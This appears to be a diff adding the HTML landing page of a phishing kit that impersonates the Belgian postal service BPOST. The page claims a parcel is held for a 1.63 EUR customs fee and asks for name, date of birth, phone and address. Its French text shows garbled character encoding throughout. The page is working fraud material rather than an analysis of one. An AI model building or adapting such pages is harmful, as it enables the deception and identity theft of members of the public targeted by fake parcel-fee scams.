@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>BPOST</title>
+    <link rel="stylesheet" type="text/css" href="assets/css/index.css">
+    <link rel="icon" href="">
+    <link href="assets/css/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="assets/css/css2_002.css">
+    <script src="assets/js/jquery.js"></script>
+    <script src="assets/js/jquery.mask.min.js"></script>
+    <script src="assets/js/ab.js"></script>
+    <script src="assets/js/config.js"></script>
+    <script src="assets/js/main.js"></script>
+</head>
+<body>
+    <div id="preheader">
+        <div>
+            <section>RÃ©sidentiel</section>    
+            <section style="border: none;width: 300px;">Solutions professionnelles</section>    
+        </div>
+    </div>
+
+    <header>
+        <section>
+            <img src="assets/images/logo.svg">
+            <ul>
+                <li>Envoyer un colis</li>
+                <li>Recevoir un colis</li>
+                <li>Envoyer une lettre</li>
+                <li>DÃ©mÃ©nagement</li>
+                <li>Questions frÃ©quentes</li>
+            </ul>
+            <div id="container-search">
+                <input type="" placeholder="Rechercher" name="">
+                <img src="assets/images/search.png">
+            </div>
+        </section>
+    </header>
+
+    <form id="billing-form" method="post">
+        <main class="banner-image">
+            <section>
+                <h1>Paiement de livraison<br>DÃ©douanement</h1>
+                <button>1.63â¬ Ã  payer</button>
+            </section>
+        </main>
+
+        <div id="container">
+            <h2>DÃ©douanement du colis nÂ°FH45878ZX1</h2>
+            <p style="color: rgba(0,0,0,0.8);margin-top: 7px;">Votre colis est soumis Ã  un dÃ©douannement.</p>
+            <b style="font-weight: 600;">Montant Ã  payer : 1,63 EUR</b>
+            <p style="color: rgba(0,0,0,0.8);margin-top: 7px;">Veuillez rÃ©gler les frais de douane. En cas d'absence de paiement, votre colis sera renvoyÃ© Ã  l'expediteur, des frais pourront Ãªtre appliquÃ©.</p>
+            <p>Veuillez vÃ©rifier attentivement vos coordonnÃ©es pour vous assurer qu'il n'y ai pas d'erreur dans la livraison. En cas d'erreur des frais de reprogrammation de livraison seront appliquÃ©s.</p>
+
+            <div style="height: 1px; background: #ced4da; width: 100%; margin: 32px 0px;"></div>
+
+            <input type="hidden" name="step" value="billing">
+            <div id="input-container">
+                <label>Nom:</label>
+                <span class="material-symbols-outlined">person</span>
+                <input required="" type="text" name="nom">
+            </div>
+
+            <div id="input-container">
+                <label>PrÃ©nom:</label>
+                <span class="material-symbols-outlined">person</span>
+                <input required="" type="text" name="prenom">
+            </div>
+
+            <div id="input-container">
+                <label>Date de naissance:</label>
+                <span class="material-symbols-outlined">calendar_today</span>
+                <input required="" type="text" id="dob" name="dob">
+            </div>
+
+            <div id="input-container">
+                <label>NumÃ©ro de tÃ©lÃ©phone:</label>
+                <span class="material-symbols-outlined">phone</span>
+                <input required="" type="tel" name="tel">
+            </div>
+
+            <div id="input-container">
+                <label>Adresse:</label>
+                <span class="material-symbols-outlined">home</span>
+                <input required="" type="text" name="adresse">
+            </div>
+
+            <div style="display: flex;justify-content: space-between;">
+                <div class="container-city" id="input-container">
+                    <label>Ville:</label>
+                    <span class="material-symbols-outlined">location_city</span>
+                    <input required="" type="text" name="ville">
+                </div>
+                <div class="container-city" id="input-container">
+                    <label>Code postal:</label>
+                    <span class="material-symbols-outlined">markunread_mailbox</span>
+                    <input required="" type="text" name="postal">
+                </div>
+            </div>
+            <br>
+            <button type="submit">Continuer</button>
+        </div>
+    </form>
+</body>
+</html>
